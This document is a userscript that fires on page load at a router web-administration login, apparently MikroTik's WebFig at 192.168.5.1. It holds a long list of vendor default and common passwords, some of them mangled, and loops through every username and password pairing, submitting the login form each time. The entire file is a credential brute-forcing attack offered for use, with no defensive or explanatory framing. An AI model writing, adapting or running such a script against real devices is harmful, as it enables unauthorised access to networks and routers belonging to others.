// ==UserScript==
// @id             org.userscripts.users.JJurM.JJurM_1
// @name           JJurM_1
// @description    JJurM's project 1.
// @author         JJurM
// @include        http://192.168.5.1/webfig/
// ==/UserScript==

document.getElementsByTagName("body")[0].onload = bf();

function bf()
  {
  var words = new Array("qwerty","Admin","admin","password","synnet","tech","ilmi","adminttd","comcomcom","security","rip000","monitor","manager","recovery","1234admin","volition","anicust","0","secret","secure","adtran","kermit","dhs3mt","at4400","mtch","mtcl","letacla","dhs3pms","adfexc","client","llatsni","tlah","1064","switch","permit","friend","linga","root","acc","backdoor","tenmanufactorypower „,“apc","device","public","atc123","asante","lucenttech2","ascend","3ascotel","none","tjm","root500","danger","xxyyzz","crftpw","cms500","pass","netics","miniap","bintec","snmp-trap","patrol","the","master","laflaf","helpdesk","super","fivranne","access","mediator","mau'dib","cellit","diamond","cmaker","changeme","attack","changeme2","null","public","private","secret","cisco","default","system","administrator","user","operator","240653c9467e45","cgadmin","surt","tslinux","tini","letmein","any@","davox","mserver","my_demarc","bridge","pbx","network","d-link","1234","4getme2","hs7mwxkk","netadmin","netman","help","epicrouter","supervisor","posterie","connect","radius","hpp187","hpp189","hpp196","intx3","itf3000","netbase","rego","rje","conv","sys","disc","support","cognos","hpoffice","hpoffice data","hp","mgr","service","hpp187 sys","lotus","hpword pub","hponly","manager.sys","mgr.sys","field.support","op.operator","mail","remote","telesup","mpe","tch","carolian","vesoft","xlserver","hpdesk","ccc","cnas","word","robelle","hp.com","specialist","r1qtps „,“abc123","niconex","setup","intel","hello","masterkey","intermec","$chwarzepumpe","jde","proddta","lantronix","changeme(exclamation)","cascade","lucenttech1","ui-pswd-01","ui-pswd-02","aitbisp4ecig","bciimpw","bcimpw","bcmspw","bcnaspw","bluepw","browsepw","looker","craft","craftpw","custpw","enquirypw","indspw","inads","initpw","locatepw","maintpw","rwmaint","nmspw","rcustpw","supportpw","field","medion","star","rsx","smile","router","motorola","sysadm","admin123","globaladmin","5777364","21241036","private","naadmin","netopia","noway","netscreen","netcache","e500changeme","e250changeme","asd","netvcr","xdfk9874t3","m1122","telecom","4tas","maint","mlusr","l2","l3","ro","rw","rwa","1111","8429","3ep5w2u","ntacdmax","ccrusr","plschgme","266344","adslolitec","smdr","ocs","uplink","cacadmin","and 2000 series","$secure$","superuser","mu","microbusiness","spip","h179350","lp","radware","raidzone","trancell","q","piranha","col2ogro2","rmnetlm","replicator","gen1","gen2","admn","engineer","op","sysadmin","pwp","n/a","sky_fox","ganteng","sitecom","smcadmin","barricade","multi","often blank","protector","speedxess","symbol","tandberg","xbox","tellabs#1","admin_1","tiaranet","extendnet","enter","nau","http","12345","166816","visual","wyse","winterm","fireport","r@p8p0r+","xd","2222","1502","zoomadsl","isee","123456","sys","change_on_install","dadmin01","hagpolm1","smallbusiness","10023","articon","123","exabyte","scmchangeme","22222","9999","jannie","corecess","ironport","webadmin","installer","_cisco","blender","hsadb","wlsedb","michelangelo","tiger123","pento","guest","sesame","3477","8111","highspeed","pilou","calvin","passw0rd","telco","pbxk1064","kilo1987","help1954","tuxalize","3ware","w2402","atlantis","tivonpw","talent","ssa","wlsepassword","netsurvibox","x-admin","sharp","561384","nokai","nokia","expert03","ans#150","stratauser","serial#","otbu+1","31994","scout","geardog","wrgg15_di524","wireless","passwort","56789","okilan","isp","ggdaseuaimhrke","citel","pfsense","0p3n","adslroot","nimdaten","bcpb+serial#","x40rocks","!manage","5678","timely","w0rkplac3rul3s","leviton","p@55w0rd!","idirect","images","draadloos","@dsl_xilno","imss7.0","hawk201","456","netgear1","infrant1","admin00","password1","0000","mysweex","orion99","software01","p1nacate","d1scovery","col1ma","redips","live","mono","wampp","(none)","su@psir","menara","wg","mercury","truetime","expert","12871","detmond","prof","ANYCOM","pwd","linux","system");
  var x = 0;
  for (x in words)
    {
    var y = 0;
    for (y in words)
      {
      document.getElementById("name").value = words[x];
      document.getElementById("password").value = words[y];
      document.getElementById("dologin").click();
      }
    }
  }
